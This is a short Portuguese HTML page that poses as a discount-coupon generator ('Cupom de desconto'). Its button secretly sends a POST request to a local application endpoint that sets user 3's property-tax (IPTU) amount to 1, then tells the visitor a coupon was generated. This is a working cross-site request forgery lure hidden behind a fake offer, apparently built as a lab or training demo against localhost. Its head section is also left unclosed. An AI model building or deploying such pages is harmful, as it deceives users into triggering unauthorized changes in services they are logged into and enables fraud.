<html>
<head>
    <title>Cupons Imperdíveis</title>

    <style>
        body{
            font-family: Arial;
            display:flex;

<body>

<div class="card">
    <h1>🎁 Cupom de desconto</h1>
    <p>Clique no botão abaixo para gerar seu cupom!</p>

    <button onclick="gerarCupom()">Gerar Cupom</button>
</div>

<script>

function gerarCupom(){

   const dados = localStorage.getItem('user');
   fetch("http://localhost:3001/usuario/atualizar-iptu",{
        method: "POST",
        headers:{
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            usuarioId: 3,
            novoValor: 1
        })
    });

    alert("Cupom gerado com sucesso!");
}

</script>

</body>
</html>
